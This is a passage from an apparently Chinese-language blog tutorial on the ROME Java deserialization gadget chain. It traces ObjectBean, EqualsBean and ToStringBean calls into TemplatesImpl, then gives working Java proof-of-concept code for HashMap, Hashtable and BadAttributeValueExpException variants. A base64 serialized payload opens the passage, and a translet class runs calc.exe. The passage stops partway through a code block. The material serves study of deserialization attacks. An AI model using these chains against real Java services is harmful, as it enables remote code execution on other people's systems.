AEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+ABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu+X2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB+AAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB+AB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB+ACNxAH4ADXEAfgAGcQB+AAZxAH4ABng=</span><br></pre></td></tr></table></figure><p>然后放入Poc.java里的string    然后进行运行就可以弹出计算器了</p><p><img src="../images/image-20230427213256355.png" alt="image-20230427213256355"></p><p>现在可以对这条链子进行分析</p><h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>老样子我们先去<code>ysoserial</code>中看一下调用链的顺序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line"></span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>最上面的是链子的末尾，最下面的是链子的开头</p><p>在HashMap的readObject里面</p><p><img src="../images/image-20230508144332422.png" alt="image-20230508144332422"></p><p>使用了putVal()方法，然后里面嵌=嵌套着一个hash法，先去看看hash()方法</p><p><img src="../images/image-20230508144501904.png" alt="image-20230508144501904"></p><p>会调用hashcode()方法  这里的key就是ObjectBean这个类了</p><p>然后就在这个类的hashcode()处打个断点</p><p><img src="../images/image-20230508145415802.png" alt="image-20230508145415802"></p><p>然后就开始调试</p><p><img src="../images/image-20230508145754594.png" alt="image-20230508145754594"></p><p>ObjectBean.hashcode调用了EqualsBean.beanHashCode方法</p><p><img src="../images/image-20230508150028029.png" alt="image-20230508150028029"></p><p>然后EqualsBean.beanHashCode又调用了ObjectBean.toString方法  这里的ObjectBean和开头的那个调用hashcode的ObjectBean是同一个类</p><p><img src="../images/image-20230508150156149.png" alt="image-20230508150156149"></p><p>ObjectBean.toString方法又调用了ToStringBean.toString()方法</p><p><img src="../images/image-20230508150301354.png" alt="image-20230508150301354"></p><p>然后跟进这个ToStringBean.toString()这个方法里面</p><p><img src="../images/image-20230508150422220.png" alt="image-20230508150422220"></p><p>在 toString 内部会获取 <code>this._obj</code> 的 Class 对象并获取其名称, 然后设置 prefix 为全类名的最后一位 (即 TemplatesImpl), 并在 return 时调用 <code>this.toString(prefix)</code> 这个重载方法</p><p>然后到TemplatesImpl.toString（）方法</p><p><img src="../images/image-20230508150654399.png" alt="image-20230508150654399"></p><p>方法内部先通过 <code>BeanIntrospector.getPropertyDescriptors()</code> 获取 <code>this._beanClass</code> 的 JavaBean, 然后遍历 getter, 判断其是否由 Object 类声明, 并且是否无参, 最后调用这个无参的 getter</p><p>再往下就是 TemplatesImpl 的内容了, 很容易想到它的 <code>_outputProperties</code> 属性存在 getOutputProperties 这个 getter, 并且在里面调用了 newTransformer 方法, 经过一系列调用最终加载 Java 字节码并执行它的无参构造方法</p><p>总的来说利用链还是比较简单的, 就是 ObjectBean EqualsBean ToStringBean 之间的相互调用</p><p> <strong>这里的话之后就是TemplatesImpl实例化恶意类的流程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl--&gt;getOutputProperties()</span><br><span class="line">TemplatesImpl--&gt;newTransformer()</span><br><span class="line">        TemplatesImpl--&gt;getTransletInstance()</span><br><span class="line">            TemplatesImpl--&gt;defineTransletClasses()</span><br><span class="line">                TemplatesImpl--&gt;defineClass()</span><br></pre></td></tr></table></figure><h3 id="HashTable利用链"><a href="#HashTable利用链" class="headerlink" title="HashTable利用链"></a>HashTable利用链</h3><p>这条链子实际上就是在<strong>HashMap</strong>被ban的情况下进行反序列化，因为最终目的始终都是调用<strong>hashcode</strong>函数，而HashTbale中刚好调用了<strong>hashcode</strong>，因此仍然可以触发整套流程</p><p><img src="../images/image-20230508160704668.png" alt="image-20230508160704668"></p><p>这个HashTable里面的readObject方法，里面有一个key,然后这里面又有一个reconstitutionPut()方法，跟进这个方法</p><p><img src="../images/image-20230508160835775.png" alt="image-20230508160835775"></p><p>那么就可以利用这个来替换掉HashMap了</p><p>那么利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">Hashtable&lt;K,V&gt;.reconstitutionPut(Entry&lt;?,?&gt;[], K, V)</span><br><span class="line">Hashtable&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p>这里话EqualsBean换成ObjectBean也行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        ht.put(equalsBean, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(ht);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hello.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508161225081.png" alt="image-20230508161225081"></p><h3 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h3><p>接下来我们来看这个类的定义</p><p><img src="../images/image-20230508162335613.png" alt="image-20230508162335613"></p><p><img src="../images/image-20230508162402274.png" alt="image-20230508162402274"></p><p>EqualsBean 刚好也存在 hashCode, 并且也能调用 <code>this._obj</code> 的 toString</p><p>那么这里就可以指定 <code>this._obj</code> 为 ToStringBean</p><p>这里的话在EqualsBean这个类的定义处就可以指定了</p><p>ToStringBean 的构造方法</p><p><img src="../images/image-20230508163433188.png" alt="image-20230508163433188"></p><p>我们指定 <code>_beanClass</code> 为 Templates.class, <code>_obj</code> 为 TemplatesImpl</p><p>这里为什么指定这些呢，这是在刚开始对ysoserial给的exp的时候，我们来完整跟了一遍，然后得到的参数</p><p>等下接下来的各种链子都是一样的道理</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">EqualsBean.beanHashCode()</span><br><span class="line">EqualsBean.hashCode()</span><br><span class="line">HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>paylaod</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(equalsBean, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        Serialization.test(map);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508164210620.png" alt="image-20230508164210620"></p><h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>BadAttributeValueExpException 曾在 cc 链中出现过, 它的 readObject 方法也会调用 toString</p><p><img src="../images/image-20230508165124096.png" alt="image-20230508165124096"></p><p>valObj 从自身的 val 属性获取, 之后进入 if 判断, 这里的触发条件其实是 <code>System.getSecurityManager() == null</code>, 即未开启 Java 安全管理器, 最后调用 valObj.toString()</p><p><img src="../images/image-20230508165459463.png" alt="image-20230508165459463"></p><p>这里的val可控，所以valObj也可控</p><p><strong>利用链</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">Method.invoke(Object, Object...)</span><br><span class="line">ToStringBean.toString(String)</span><br><span class="line">ToStringBean.toString()</span><br><span class="line">BadAttributeValueExpException.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Hello.class);</span><br><span class="line"></span><br><span class="line">        setFieldValue(<span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Hello&quot;</span>, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;cls.getBytes()&#125;, templatesImpl);</span><br><span class="line">        setFieldValue(<span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(), templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class, templatesImpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setFieldValue(<span class="string">&quot;val&quot;</span>, toStringBean, e);</span><br><span class="line"></span><br><span class="line">        Serialization.test(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(String name, Object value, Object obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230508165611024.png" alt="image-20230508165611024"></p><h3 id="ObjectBean"><a href="#ObjectBean" class="headerlink" title="ObjectBean"></a>ObjectBean</h3><p>ysoserial 链用的就是 ObjectBean</p><p>就是和我们文章刚开始的时候分析的一样</p><p>利用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span 